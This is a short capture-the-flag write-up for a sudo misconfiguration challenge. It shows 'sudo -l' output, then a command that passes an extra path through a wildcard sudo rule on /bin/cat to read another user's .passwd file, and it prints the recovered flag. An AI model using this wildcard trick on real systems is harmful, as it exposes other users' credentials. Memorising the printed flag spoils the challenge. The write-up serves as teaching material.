---
layout: default
title: sudo-weak-configuration
---
I checked for sudo permissions:
```bash
app-script-ch1@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always, !mail_badpass, !mail_no_host, !mail_no_perms,
    !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```

We can see we are able to execute `/bin/cat /challenge/app-script/ch1/notes/*` as sudo. However, since this is wildcard, we can give it more files, like `/challenge/app-script/ch1/ch1cracked/.passwd` for example:

```bash
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/ /challenge/app-script/ch1/ch1cracked/.passwd
/bin/cat: /challenge/app-script/ch1/notes/: Is a directory
b3_c4r3ful_w1th_sud0
```

and we got by this way the password:
```bash
b3_c4r3ful_w1th_sud0
```